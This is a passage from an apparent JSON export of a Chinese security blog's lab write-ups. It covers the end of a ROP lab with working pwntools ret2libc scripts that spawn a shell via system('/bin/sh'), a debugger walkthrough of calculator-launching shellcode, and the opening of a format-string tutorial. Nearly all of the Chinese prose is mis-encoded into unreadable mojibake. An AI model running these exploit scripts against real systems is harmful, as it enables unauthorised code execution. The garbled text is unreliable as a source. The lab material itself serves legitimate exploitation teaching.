process(\u0026#39;./rop3\u0026#39;) ret_addr= 0x7ffff7dcd000+0x0000000000025679 sys_addr= 0x7ffff7e22410 binsh_addr=0x7ffff7f845aa pr_addr = 0x7ffff7dcd000 + 0x26b72 payload = b\u0026#39;a\u0026#39;*0x88+ p64(ret_addr)+ p64(pr_addr)+p64(binsh_addr)+p64(sys_addr)+p64(0xdeadbeef) p.sendline(payload) p.interactive() Ubuntu16 ä¸­æ­£å¸¸æ²¡æœ‰å­—èŠ‚å¯¹é½ ubuntuç‰ˆæœ¬\næ‰¾åˆ°å­˜åœ¨pop rdi;retçš„æŒ‡ä»¤åœ°å€\nç›¸å¯¹åç§»åœ°å€ä¸º0x0000000000021112 systemåœ°å€\nsystem åœ°å€ä¸º 0x7ffff7a523a0 /bin/shåœ°å€\nlibc.soé¦–åœ°å€0x7ffff7a0d000,/bin/shé¦–åœ°å€0x7ffff7b99e57 expç»ˆç«¯ç›´æ¥æ‰§è¡Œ\nå‘ç°æ‹¿åˆ°shell æœ€ç»ˆexp\n1 2 3 4 5 6 7 8 9 10 11 12 from pwn import * p = process(\u0026#39;./rop3\u0026#39;) sys_addr= 0x7ffff7a523a0 binsh_addr=0x7ffff7b99e57 pr_addr = 0x7ffff7a0d000 + 0x21112 payload = \u0026#39;a\u0026#39;*0x88 + p64(pr_addr)+p64(binsh_addr)+p64(sys_addr)+p64(0xdeadbeef) p.sendline(payload) p.interactive() 0x05 å®éªŒç»“è®º å®éªŒè¿‡ç¨‹ä¸­é’ˆå¯¹å®éªŒä¸€ï¼Œåˆ†åˆ«ä½¿ç”¨äº†gdbç›´æ¥è°ƒè¯•å¾—åˆ°shellå’Œé€šè¿‡pwntoolsç»“åˆdump coreå¾—åˆ°shellä¸¤ç§æ–¹æ¡ˆï¼Œä½†æ˜¯å®é™…ä¸Šä¸¤ç§æ–¹æ¡ˆä¸­è¿ç”¨çš„åœ°å€å¹¶ä¸æ˜¯ç¨‹åºç›´æ¥è¿è¡Œæ—¶å€™bufæ•°ç»„çš„åœ°å€ï¼ŒäºŒè€…å› ä¸ºç¨‹åºè¿è¡Œç¯å¢ƒçš„å·®å¼‚ï¼Œbufçš„åœ°å€éƒ½æœ‰å·®å¼‚ã€‚ åŒæ—¶å‘¢ï¼Œè¿ç”¨gdbè°ƒè¯•shellcodeï¼Œç›´æ¥å†™å…¥æ•°æ®æ¯”è¾ƒéº»çƒ¦ï¼Œå› ä¸ºshellcodeè¯»å–éœ€è¦å­—èŠ‚æµï¼Œè¿™é‡Œçš„è§£å†³æ–¹æ¡ˆæ˜¯åˆ©ç”¨pwntoolsç”Ÿæˆçš„payloadä¿å­˜ä¸ºæ–‡ä»¶ï¼Œä»¥ç®¡é“çš„å½¢å¼å°†å…¶è¾“å…¥åˆ°gdbä¸­ã€‚æ­¤å¤–ï¼Œåœ¨æŸ¥çœ‹shellcodeè°ƒè¯•æ•ˆæœçš„æ—¶å€™ï¼Œéœ€è¦è®¾ç½®è½¯æ–­ç‚¹æ¥è°ƒç”¨å­è¿›ç¨‹ï¼Œå¹¶ä¸”ä¸€æ¬¡åªèƒ½æŸ¥çœ‹ä¸€ä¸ªå‘½ä»¤çš„ç»“æœï¼Œä¸ä¾¿äºæŒä¹…åŒ–shellè¿æ¥ï¼Œä½†æ˜¯gdbæ–¹ä¾¿è°ƒè¯•ï¼Œéšæ„è®¾ç½®æ–­ç‚¹ï¼ŒæŸ¥çœ‹è‡ªå·±æƒ³çœ‹çš„ä¸œè¥¿ï¼Œå®šä½åˆ°readå‡½æ•°é‡Œé¢æŸ¥çœ‹bufçš„åœ°å€ï¼Œå¾ˆæ–¹ä¾¿ã€‚ python è°ƒè¯•å‘¢ï¼Œå› ä¸ºç»“åˆç¨‹åºè¿è¡Œå´©æºƒäº§ç”Ÿçš„core,åœ¨pythonç¯å¢ƒä¸‹çš„bufåœ°å€ç›¸å½“æ˜æœ—ï¼Œå€ŸåŠ©pwntoolsçš„å·¥å…·ï¼Œå¾ˆå®¹æ˜“å°±å¯ä»¥æ„é€ payloadï¼Œå°†å…¶å‘é€ç»™æœåŠ¡å™¨ç«¯å¹¶å»ºç«‹æŒä¹…åŒ–çš„shellè¿æ¥ï¼Œä½†æ˜¯è°ƒè¯•çš„è¯ä¸å¤ªæ–¹ä¾¿ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨åœ¨pwntoolsé‡Œé¢è°ƒç”¨gdbæ¥å®ç°ã€‚æ‰€ä»¥æ€»ä½“æ¥è¯´ï¼Œrop1-modified.pyè„šæœ¬è°ƒè¯•æ›´ä¸ºæ–¹ä¾¿ï¼ŒåŠŸèƒ½ä¹Ÿæ›´ä¸ºå¼ºå¤§ã€‚ å¯¹äºå®éªŒäºŒ å¯¹äºUbuntu18 ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œè°ƒè¯•64ä½ç¨‹åºçš„æ—¶å€™ï¼Œæˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„payloadä¸€èˆ¬è¦è€ƒè™‘å­—èŠ‚å¯¹é½çš„å› ç´ ï¼Œä¸€èˆ¬é‡‡ç”¨retæ¥è¿›è¡Œå¯¹é½ã€‚ å……åˆ†ç†è§£äº†ROPé“¾çš„æ„é€ è¿‡ç¨‹ äº†è§£äº†Linuxä¸‹systemå’Œexecå‡½æ•°çš„ç”¨æ³•ã€‚ ","permalink":"http://www.reus09.top/posts/tech/rop/","summary":"pwn_rop è°ƒè¯• 0x01 å®éªŒç›®çš„ 1.é’ˆå¯¹å®éªŒä¸€ï¼Œé€šè¿‡gdbè°ƒè¯•rop1ï¼Œç¡®å®šshellcodeçš„åœ°å€ï¼›æ­¤å¤–ï¼Œé€šè¿‡rop1.pyçš„è°ƒè¯•è„šæœ¬ç¡®å®šshellcod","title":"Rop"},{"content":"é€†å‘åˆ†æè®¡ç®—å™¨çš„æ¼æ´åˆ©ç”¨è¿‡ç¨‹ 0x01 å®éªŒç›®çš„ æ ¹æ®å®éªŒè½¯ä»¶SCer.exe å’Œ shellcodeä»£ç shellcode2020.mybinï¼Œé€šè¿‡windbgé€†å‘åˆ†æå¼¹å‡ºè®¡ç®—å™¨çš„æ¼æ´åˆ©ç”¨è¯¦ç»†è¿‡ç¨‹ æ ¹æ®å®éªŒè½¯ä»¶shellcode2020.exeï¼Œé€šè¿‡Ollydbgé€†å‘åˆ†æå¼¹å‡ºè®¡ç®—å™¨çš„æ¼æ´åˆ©ç”¨è¯¦ç»†è¿‡ç¨‹ã€‚ åˆ†æä¸¤è€…åŒºåˆ«ã€‚ 0x02 è¯•éªŒå·¥å…· windbg Ollydbg IDA_PRO å› ä¸ºWindows xp sp3ä¸‹çš„Windbgå¾®è½¯å°†å…¶åœ¨çº¿Symbolç¬¦å·ä¸‹æ¶ï¼Œå¯¼è‡´Windbgè°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œéƒ¨åˆ†å…³é”®å‡½æ•°ä¸ºä¹±ç ï¼Œæ— æ³•æ­£å¸¸åˆ†æï¼Œæ•…å€Ÿé‰´Ida å®éªŒç¯å¢ƒ Windows xp sp3 0x03 windbg è°ƒè¯• Scer.exe æ‰“å¼€Scer.exeï¼Œç„¶åå°†shellcode.txt.mybiné™„åŠ åˆ°ç¨‹åºï¼Œå¯ä»¥å‘ç°è®¡ç®—å™¨å¯ä»¥æ­£å¸¸æ‰“å¼€ã€‚\néœ€è¦å¯¹Scer.exeè¿›è¡ŒåŠ¨æ€è°ƒè¯•åˆ†æï¼Œä¸ºäº†è°ƒè¯•åˆ†ææ¤å…¥çš„shellcode,æˆ‘ä»¬åœ¨shellcode.txt.binå‰åŠ ä¸Šå­—èŠ‚0xCC\nç„¶ååœ¨windbgä¸­é™„åŠ  Scer.exeçš„è¿›ç¨‹ã€‚\nè¿™é‡Œç¨‹åºä¼šåœåœ¨ç³»ç»Ÿä»£ç åŒºåŸŸï¼Œæˆ‘ä»¬è¦è¿›å…¥ç”¨æˆ·ä»£ç é‡Œé¢ã€‚ WinDbgé‡Œæœ‰ä¸ªä¼ªå¯„å­˜å™¨å«$exentryï¼Œé‡Œé¢è®°å½•äº†ç¨‹åºçš„å…¥å£ç‚¹ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦åœ¨å‘½ä»¤è¾“å…¥æ é‡Œè¾“å…¥bp $exentry ç„¶åæ‰§è¡Œå‘½ä»¤gå³å¯è¿›å…¥ç”¨æˆ·ç¨‹åºå…¥å£ã€‚ è¿™é‡Œç»“åˆIDA_proï¼ŒF5åç¼–è¯‘å¯ä»¥çœ‹åˆ° è¿™é‡Œå®ç°äº†ç¨‹åºçš„åˆå§‹åŒ–ï¼Œå°±ä¸åœ¨è¿‡å¤šåˆ†æã€‚ è¿™é‡Œé€šè¿‡IDA_PROï¼Œæ‰¾åˆ°æˆ‘ä»¬åŠ è½½æ ¸å¿ƒä»£ç shellcode çš„é¦–åœ°å€ã€‚\né¦–å…ˆshift+F12æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°å­—ç¬¦ä¸²çŠ¶æ€:0x%0.8x å·²è½½å…¥shellcode,å³å°†å¼€å§‹æ‰§è¡Œ...ï¼Œä¸€è·¯åè·Ÿè¸ªå‡½æ•°è¿”å›ï¼Œæ‰¾åˆ°è¯¥æ®µåŠŸèƒ½çš„é¦–åœ°å€ä¸ºï¼š0x401830 ä¹Ÿå°±æ˜¯è¯´åœ¨æ­¤æ®µä»£ç ä¸­ï¼Œæˆ‘ä»¬å®ç°äº†å‘ç¨‹åºä¸­è¾“å…¥shellcodeåï¼Œç¨‹åºå¦‚ä½•å¤„ç†shellcodeä»¥åŠå¦‚ä½•è·³è½¬åˆ°shellcodeçš„è¿‡ç¨‹ åœ¨windbg ä¸‹ è®¾ç½®æ–­ç‚¹ bp 0x401830\nåŠ è½½æˆ‘ä»¬çš„shellcode åï¼Œå°±å¯ä»¥åœ¨windbgä¸­è°ƒè¯• çœ‹åˆ°ç¨‹åºæ€ä¹ˆå°†shellcodeå­˜æ”¾èµ·æ¥å¹¶æ‰§è¡Œã€‚ ç„¶åè¾“å…¥pcè·³è½¬åˆ°ä¸‹ä¸€ä¸ªcall æŒ‡ä»¤ï¼Œç„¶åæ­¥å…¥ï¼Œè¿™ä¸ªå‡½æ•°ä¸º CreateFileAã€‚\nå‘ç°è¯¥å‡½æ•°åŠŸèƒ½å®ç°äº†åˆ›å»ºä¸€ä¸ªçº¿ç¨‹\u0026mdash;\u0026mdash;\u0026mdash;-æ‰“å¼€æ–‡ä»¶å¤¹ï¼Œå³æˆ‘ä»¬çš„shellcodeæ–‡ä»¶ã€‚ ç»§ç»­pcè·³è½¬åˆ°ä¸‹ä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œè¿™ä¸ªå‡½æ•°ä¸º VirtualAlloc\nè¿™é‡ŒæŸ¥çœ‹ä¸€ä¸‹VirtualAllocå‡½æ•°çš„ç»“æ„\n1 2 3 4 5 6 LPVOID VirtualAlloc{ LPVOID lpAddress, // è¦åˆ†é…çš„å†…å­˜åŒºåŸŸçš„åœ°å€ DWORD dwSize, // åˆ†é…çš„å¤§å° DWORD flAllocationType, // åˆ†é…çš„ç±»å‹ DWORD flProtect // è¯¥å†…å­˜çš„åˆå§‹ä¿æŠ¤å±æ€§ }; å¹¶ä¸”ä¸è°ƒå…¥å‡½æ•°å‰ä¼ å…¥çš„å‚æ•°ç›¸ç»“åˆå¯¹æ¯”ï¼Œ\nå‘ç° ebx å­˜å–çš„æ˜¯ æˆ‘ä»¬shellcode çš„å­—èŠ‚é•¿åº¦ï¼Œesiå­˜æ”¾çš„æ˜¯ ç¨‹åºç»™ shellcode åˆ†é…çš„åŠ¨æ€åœ°å€ã€‚\nç¨‹åºæ‰§è¡Œå®Œæ¯•åï¼Œå¾ˆæ˜æ˜¾å¯ä»¥å‘ç°äº†esi å­˜å–çš„ åœ°å€ä¸º 0xb40000\nè¿™é‡Œå°±å®ç°äº†ä¸º shellcodeçš„å­˜å– æå‰åˆ†é…å¥½äº† åŠ¨æ€åœ°å€ï¼Œ èµ·å§‹åœ°å€ä¸º 0xb40000\nç»§ç»­pcè·³è½¬åˆ°ä¸‹ä¸€ä¸ªcallå‡½æ•°ï¼Œè¯¥å‡½æ•°åå­—ä¸º ReadFile\nè¿™é‡ŒæŸ¥çœ‹ä¸€ä¸‹VirtualAllocå‡½æ•°çš„ç»“æ„\n1 2 3 4 5 6 7 8 9 BOOL ReadFile( HANDLE hFile, //æ–‡ä»¶çš„å¥æŸ„ LPVOID lpBuffer, //ç”¨äºä¿å­˜è¯»å…¥æ•°æ®çš„ä¸€ä¸ªç¼“å†²åŒº DWORD nNumberOfBytesToRead, //è¦è¯»å…¥çš„å­—èŠ‚æ•° LPDWORD lpNumberOfBytesRead, //æŒ‡å‘å®é™…è¯»å–å­—èŠ‚æ•°çš„æŒ‡é’ˆ LPOVERLAPPED lpOverlapped //å¦‚æ–‡ä»¶æ‰“å¼€æ—¶æŒ‡å®šäº†FILE_FLAG_OVERLAPPEDï¼Œé‚£ä¹ˆå¿…é¡»ï¼Œç”¨è¿™ä¸ªå‚æ•°å¼•ç”¨ä¸€ä¸ªç‰¹æ®Šçš„ç»“æ„ã€‚ //è¯¥ç»“æ„å®šä¹‰äº†ä¸€æ¬¡å¼‚æ­¥è¯»å–æ“ä½œã€‚å¦åˆ™ï¼Œåº”å°†è¿™ä¸ªå‚æ•°è®¾ä¸ºNULL ); æ­¤æ—¶çš„å¯„å­˜å™¨æƒ…å†µï¼š\nå°†å‡½æ•°ç»“æ„ ä¸ ä¼ å‚å‰çš„ æ±‡ç¼–è¯­è¨€è¿›è¡Œ å¯¹æ¯”ã€‚\nå¯ä»¥å‘ç°å‡½æ•°å®ç°äº†åœ¨åœ°å€ä¸ºesi :: 0xb40000 çš„ç¼“å†²åŒº å­˜å–äº† é•¿åº¦ä¸º27 å­—èŠ‚çš„ shellcodeã€‚\nç»§ç»­pcè¿›è¡Œåˆ°sleepå‡½æ•°ã€‚\nå› ä¸ºè¦ç­‰å¾…æ­¤æ—¶çš„çº¿ç¨‹å®Œæˆã€‚ ç»§ç»­pæŒ‡ä»¤ å•æ­¥è·³è¿‡ï¼Œä¸€ç›´åˆ°\næ­¤æ®µæ•´ä½“æ±‡ç¼–ä»£ç å¯¹åº”ç”¨IDA_Proæ˜¾ç¤º\nmov bp+ms_exc.registration.TryLevel], 0 ; è¿›å…¥ç¬¬ä¸€ä¸ª__tryåŸŸ,TryLevel=0\nmov ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh ; ç¦»å¼€ç¬¬ä¸€ä¸ª__tryåŸŸï¼ŒTryLevel=TRYLEVEL_NONE (-2)\næ‰€ä»¥æ­¤æ®µä¸º try_except çš„è¿‡ç¨‹ã€‚\nç„¶åå‘ç°å­˜åœ¨æ±‡ç¼–è¯­å¥call eax\ncall eax æ¥è‡ª [ebp + var_24]\nè¿½è¸ªå‘ç° [ebp+var_24]å­˜æ”¾çš„æ˜¯esiçš„åœ°å€ï¼Œå³0xb40000 å› æ­¤è¿™æ®µä»£ç ï¼Œå°±æ˜¯ç¨‹åºè¿›å…¥é¢„å…ˆåˆ†é…å¥½çš„åŠ¨æ€å†…å­˜åŒº(é‡Œé¢å­˜æœ‰shellcodeï¼‰çš„å…¥å£ã€‚\nè¿›å…¥å‡½æ•°ï¼Œåˆ†æshellcodeã€‚\nç¨‹åºæ‰§è¡Œåˆ°0xb40001è·³è½¬åˆ°åœ°å€0xb40019ï¼Œç„¶åå‘ç°åœ¨åœ°å€0xb40019çš„ jmp æŒ‡ä»¤è·³è½¬åˆ° 0xb40003\nè¿™é‡Œè§£é‡Šä¹ˆè¦å…ˆcall è·³è½¬åˆ° 0xb40019ç„¶åå†å›åˆ°0xb40003\ncall/popæŒ‡ä»¤ Shellcodeå¯ä»¥é€šè¿‡åœ¨ä¸€ä¸ªcallæŒ‡ä»¤åç«‹å³æ‰§è¡ŒpopæŒ‡ä»¤ï¼Œå°†ä¸Šä¸€åˆ»å‹å…¥æ ˆä¸­çš„æŒ‡ä»¤åœ°å€è½½å…¥åˆ°å¯„å­˜å™¨ä¸­ï¼Œä»è€Œè·å–åˆ°shellcodeèµ·å§‹çš„å†…å­˜åœ°å€ã€‚ åŸç†å°±æ˜¯ï¼šcall æŒ‡ä»¤å®é™…ä¸Šå°±æ˜¯ å…ˆå°†è¯¥å‡½æ•°çš„ä¸‹ä¸€ä¸ªåœ°å€å‹å…¥æ ˆä¸­ï¼Œç„¶åè·³è½¬åˆ°ç›®çš„åœ°å€ã€‚è·³è½¬ä¹‹åå†å°†å…¶popå‡ºæ¥ï¼Œè¿™æ ·å°±è¾¾åˆ°äº†ebx å­˜æ”¾ åœ°å€0xb4001eçš„ä½œç”¨ã€‚ è¿™é‡Œé€šè¿‡call 0xb40003æŒ‡ä»¤è°ƒç”¨å®Œä¹‹åå¯¹æ ˆçš„åˆ†æï¼Œå¯ä»¥çœ‹å‡ºã€‚ æ˜¾ç„¶ï¼Œæ ˆæœ€é¡¶å±‚ä¸ºcalc.exe å­˜æ”¾çš„åœ°å€ã€‚ ç„¶åå¼€å§‹ pop ebx ï¼Œå°† eax æ¸…é›¶ã€‚\nç„¶åå‘æ ˆä¸­å‹å…¥ ebx,eaxã€‚ ebxæ­¤æ—¶å­˜æ”¾çš„åœ°å€ä¸º0xb4001eå³å­—ç¬¦ä¸²\\x63\\x61x6c\\x63\\x2e\\x65\\x78\\x65å¯¹åº”çš„calc.exe\nå°†å‡½æ•°kernel32!WinExecåœ°å€ä¼ ç»™ebxã€‚\nä¸Šé¢ä¸¤ä¸ªå‹æ ˆç›¸å½“äº å¯¹ä¸‹é¢çš„å‡½æ•° kernel32!WinExecè¿›è¡Œä¼ å‚ã€‚\n1 2 UINT WinExec( LPCSTR lpCmdLine, UINT uCmdShow ); è¿™æ ·å°±ç›¸å½“äºè°ƒç”¨å‡½æ•° winExec(\u0026quot;calc.exe\u0026quot;,0)æ¥æ‰“å¼€è®¡ç®—å™¨ã€‚\nå‡½æ•°è°ƒç”¨å®Œæˆåã€‚å°†eaxç½®0ï¼Œç„¶åå…¥æ ˆï¼Œå°†å‡½æ•°kernel32!ExitProcessåœ°å€ä¼ ç»™ebxã€‚ç›¸å½“äºå‘å‡½æ•°kernel32!ExitProcessä¼ å…¥å‚æ•°ï¼Œç»“æŸè°ƒç”¨çš„è¿›ç¨‹åŠå…¶æ‰€æœ‰çš„çº¿ç¨‹windowså‡½æ•°ã€‚\nshellcodeåˆ†æå®Œæ¯•ã€‚\nåœ¨å‘½ä»¤ä¸­è¾“å…¥gï¼Œå³å¯å¼¹å‡ºè®¡ç®—å™¨ã€‚\n0x04 Ollydbg è°ƒè¯• shellcode2020.exe ç›´æ¥æ‰§è¡Œshellcode2020.exeä¼šç›´æ¥å¼¹å‡ºè®¡ç®—å™¨ã€‚\nåŠ¨æ€åˆ†æå‰:\né€šè¿‡IDA_Pro å¯ä»¥ç›´æ¥å®šä½åˆ° mainå‡½æ•°åœ°å€ä¸º : 0x401290 åœ¨Ollydbgä¸­è®¾ç½®æ–­ç‚¹0x401290,ç„¶åè¿è¡Œç¨‹åºè·³è½¬åˆ°è¯¥åœ°å€\n1 2 3 4 5 6 7 8 9 10 push ebp mov ebp,esp æ›´æ–°å‡½æ•°æ ˆå¸§ sub esp,8 and esp,FFFFFFF0 mov eax,0 add eax,0f add eax,0f shr eax,4 shl eax,4 å°† (eax + 0f + 0f )å…ˆå·¦ç§»ä¸€ä½ï¼Œåå³ç§»ä¸€ä½ï¼Œç»“æœä¸º00000010 ç„¶åè¿›å…¥åˆ°åœ°å€ä¸º0x401710çš„å‡½æ•°ï¼Œç»“åˆIDAï¼Œè¯¥å‡½æ•°ä¸ºallocaå‡½æ•°ï¼Œäº§ç”Ÿå‡½æ•°æŒ‡é’ˆã€‚\n1 2 3 4 5 6 7 8 åŸå‹ï¼š void * __cdecl alloca(size_t); å‚æ•°ï¼š size_t: ç”³è¯·åˆ†é…å†…å­˜çš„å°ºå¯¸ è¿”å›å€¼ï¼š void*: åˆ†é…åˆ°çš„å†…å­˜åœ°å€ allocaä¸malloc,calloc,reallocç±»ä¼¼,éœ€è¦æ³¨æ„çš„æ˜¯å®ƒç”³è¯·çš„æ˜¯â€œæ ˆ(stack)â€ç©ºé—´çš„å†…å­˜ï¼Œç”¨å®Œä¼šåœ¨é€€å‡ºæ ˆæ—¶è‡ªåŠ¨é‡Šæ”¾ï¼Œæ— éœ€æ‰‹åŠ¨é‡Šæ”¾ã€‚ allocaä¸å®œä½¿ç”¨åœ¨å¿…é¡»å¹¿æ³›ç§»æ¤çš„ç¨‹åºä¸­, å› ä¸ºæœ‰äº›æœºå™¨ä¸ä¸€å®šæœ‰ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„\u0026#34;å †æ ˆ\u0026#34; è¿›å…¥å‡½æ•°0x4013b0ï¼Œæ‰§è¡ŒåŠ è½½å‡½æ•°ï¼Œå°†shellcodeåŠ è½½åˆ°ä»£ç åŒºã€‚\nç„¶åè®¾ç½®æ–­ç‚¹ 0x4012baï¼Œç„¶åå•æ­¥æ­¥å…¥\nå‘ç°dword ptr[ebp - 4]è¢«èµ‹å€¼ä¸ºåœ°å€0x402000 è§‚å¯ŸIDAï¼Œå‘ç°åœ°å€0x40200çš„åœ°æ–¹å­˜å–çš„æ•°æ®ä¸ºevilæ•°ç»„ï¼Œå³shellcodeå­˜æ”¾åœ°å€ã€‚ åŒæ—¶0x402000ä¹Ÿæ˜¯æ–‡ä»¶æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œdataç«¯çš„èµ·å§‹ä½ç½®ã€‚ æ­¥å…¥ï¼ŒæŸ¥çœ‹shellcodeã€‚\nå‘ç°å¤§è‡´æµç¨‹å’Œwindbgåˆ†æè¿‡ç¨‹ä¸€æ ·ã€‚\né€šè¿‡callå’Œpopç»“åˆè¿ç”¨ï¼Œå°†ebxèµ‹å€¼ä¸º åœ°å€0x40201d ebxæ­¤æ—¶å­˜æ”¾çš„ä¸ºå­—ç¬¦ä¸²calc.exe ç„¶ååŒæ ·çš„å‹æ ˆæ“ä½œï¼Œè°ƒç”¨å‡½æ•°Kernel32!WinExecè¿›è¡Œæ‰§è¡Œè®¡ç®—å™¨ã€‚\næ‰§è¡Œå®Œæ¯•åï¼Œåˆå°†eaxç½®0 ï¼Œå°†å‡½æ•°kernel32!ExitProcessçš„åœ°å€ä¼ ç»™ebx,è°ƒç”¨ebxåœ°å€æ‰€åœ¨çš„ç¨‹åºï¼Œå³ExitProcess(\u0026lsquo;0\u0026rsquo;)ï¼Œé€€å‡ºç¨‹åºã€‚\n0x05 æ€»ç»“(åŒºåˆ«) Scer.exeåˆ›é€ ä¸€ä¸ªæ–°çš„çº¿ç¨‹ï¼Œç„¶åé€šè¿‡è¯»å–æ–‡ä»¶å†…å®¹ä½œä¸ºshellcodeï¼Œå¹¶é€šè¿‡VirtualAllocç”³è¯·å†…å­˜ï¼Œxpé‡Œé¢è¿™ä¸ªå†…å­˜åœ°å€å‡ä¸º0xb40000å¹¶ä¸”ç”¨esiä¿å­˜è¿™ä¸ªåœ°å€ï¼Œç„¶åReadFileå³åœ¨è™šæ‹Ÿåœ°å€0xb40000ä¸­å†™å…¥shellcodeï¼Œç„¶åé€šè¿‡format,updateç­‰å‡½æ•°shellcodeè¿›è¡Œè½¬æ¢ï¼Œæœ€ååœ°å€å°†å…¶ä½œä¸ºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œè¿›è¡Œè°ƒç”¨ï¼Œè¿›å…¥shellcodeã€‚ shellcode2020.exeåˆ™æ˜¯åœ¨æ–‡ä»¶çš„.dataç«¯ å­˜æ”¾æˆ‘ä»¬çš„shellcodeã€‚é€šè¿‡å‡½æ•°allocaæ¥åœ¨å †ä¸Šç”³è¯·å†…å­˜ï¼Œå¹¶ä¸”ç”¨å‡½æ•°æŒ‡é’ˆå¯¹å…¶è°ƒç”¨ï¼Œæœ€åè°ƒç”¨.dataçš„èµ·å§‹åœ°å€ï¼Œè¿è¡Œæˆ‘ä»¬æ„é€ çš„shellcode,å¯ä»¥è¿è¡Œè®¡ç®—å™¨ã€‚ å› æ­¤ä¸¤è€…çš„åŒºåˆ«ï¼šä¸€ä¸ªæ˜¯ä»å¤–éƒ¨æ¤å…¥shellcodeï¼Œå°†å…¶åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå¦ä¸€ä¸ªæ˜¯ç¨‹åºæœ¬èº«è‡ªå¸¦çš„shellcodeï¼Œé€šè¿‡æ„é€ å‡½æ•°æŒ‡é’ˆæ¥æ‰§è¡Œshellcodeã€‚ ","permalink":"http://www.reus09.top/posts/tech/shellcode-%E8%AE%A1%E7%AE%97%E5%99%A8/","summary":"é€†å‘åˆ†æè®¡ç®—å™¨çš„æ¼æ´åˆ©ç”¨è¿‡ç¨‹ 0x01 å®éªŒç›®çš„ æ ¹æ®å®éªŒè½¯ä»¶SCer.exe å’Œ shellcodeä»£ç shellcode2020.mybinï¼Œé€šè¿‡win","title":"Shellcode è®¡ç®—å™¨"},{"content":"æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ 0x01 ç›®çš„ é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æŒæ¡æ³„éœ²å†…å­˜æ•°æ®å’Œè¦†å†™å†…å­˜ã€‚ 0x02 åŸºç¡€çŸ¥è¯† æ ¼å¼åŒ–å‡½æ•°æ˜¯ä¸€ç§ç‰¹æ®Šçš„ANSI Cå‡½æ•°ï¼Œå®ƒä»¬ä»æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­æå–å‚æ•°ï¼Œå¹¶å¯¹è¿™äº›å‚æ•°è¿›è¡Œå¤„ç†ã€‚è€Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å°†Cè¯­è¨€çš„ä¸»è¦æ•°æ®ç±»å‹ï¼Œä»¥æ˜“äºé˜…è¯»çš„æ–¹å¼ä¿å­˜åœ¨å­—ç¬¦ä¸²é‡Œã€‚ä»ç¨‹åºè¾“å‡ºæ•°æ®ã€æ‰“å°é”™è¯¯ä¿¡æ¯åˆ°å¤„ç†å­—ç¬¦ä¸²æ•°æ®ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å‡ ä¹å‡ºç°åœ¨æ‰€æœ‰çš„Cç¨‹åºä¸­ã€‚\nprintf åŠŸèƒ½ï¼šå‘stdoutæŒ‰è§„å®šçš„æ ¼å¼è¾“å‡ºä¿¡æ¯ï¼›\næ ¼å¼ï¼š\n1 int printf (const char *format,[argument]...) formatæ˜¯æ ¼å¼æ§åˆ¶å­—ç¬¦ä¸²ï¼Œå…¶ä»–å‚æ•°ä¸ºè¾“å‡ºé¡¹ï¼› printf(\u0026quot;Id=%d\u0026quot;,Id); sprintf åŠŸèƒ½ï¼šæŠŠæ ¼å¼åŒ–çš„æ•°æ®å†™å…¥æŸä¸ªå­—ç¬¦ä¸²ä¸­ï¼›\næ ¼å¼ï¼š\n1 int sprintf(char *buffer,const char *format,[argument]...) bufferæ˜¯è¦å¸ä¹³å­—ç¬¦ä¸²çš„ç¼“å†²åŒºï¼› å‡½æ•°æŒ‰ç…§ç¬¬äºŒéƒ¨åˆ†æ ¼å¼åŒ–å­—ç¬¦çš„æ ¼å¼ï¼ŒæŠŠç¬¬ä¸‰éƒ¨åˆ†çš„æ•°æ®è¿›è¡Œæ ¼å¼åŒ–ï¼Œç„¶ååœ¨æŠŠæ ¼å¼åŒ–åçš„æ•°æ®ç±»å‹ï¼Œå­˜å‚¨åˆ°å­—ç¬¦ä¸²çš„ç¼“å­˜åŒºé—´é‡Œå»ï¼› sprintf(buffer, \u0026quot;Id=%d\u0026quot;, Id); snprintf åŠŸèƒ½ï¼šæŠŠæ ¼å¼åŒ–çš„æ•°æ®å†™å…¥æŸä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œæ§åˆ¶å­—ç¬¦ä¸²é•¿åº¦ï¼›\næ ¼å¼ï¼š\n1 int snprintf(char *str,size_t size,const char *format,[argument]...) åœ¨sprintfçš„åŸºç¡€ä¸Šé™åˆ¶äº†å¯å†™å…¥å­—ç¬¦çš„æœ€å¤§å€¼sizeï¼› å½“æ ¼å¼åŒ–åçš„å­—ç¬¦ä¸²é•¿åº¦=sizeï¼Œåˆ™å°†å…¶ä¸­çš„size-1ä¸ªå­—ç¬¦å¤åˆ¶åˆ°strä¸­ï¼Œå¹¶åœ¨æœ€åæ·»åŠ å­—ç¬¦ä¸²ç»“æŸç¬¦\\0ï¼› sprintf(buffer, 10,\u0026quot;Id=%d\u0026quot;, Id); fprintf åŠŸèƒ½ï¼šç”¨äºæ ¼å¼åŒ–è¾“å‡ºåˆ°ä¸€ä¸ªæµ/æ–‡ä»¶ä¸­ï¼›\næ ¼å¼ï¼š\n1 int fprintf(FILE *stream,const char *format,[argument]...) æ ¹æ®æŒ‡å®šçš„æ ¼å¼æ§åˆ¶å­—ç¬¦ä¸²formatå‘è¾“å‡ºæµstreamä¸­å†™å…¥æ•°æ®ï¼› å½“streamä¸ºstdoutæ—¶ï¼Œfprintfä¸printfçš„åŠŸèƒ½ç›¸åŒï¼› printf(pfile,\u0026quot;Id=%d\u0026quot;,Id); vprintf/vsprintf/vsnprintf/vfprintf åŠŸèƒ½åˆ†åˆ«å¯¹åº”äºprintf/sprintf/snprintf/fprintfï¼› å°†å˜å‚åˆ—è¡¨æ¢æˆäº†va_listç±»å‹çš„å‚æ•° æ ¼å¼ï¼š vprintf (format,va_list); vsprintf (buffer,format,va_list); vsnprintf (buffer,256,format,va_list); vfprintf(stream, format, va_list); æ 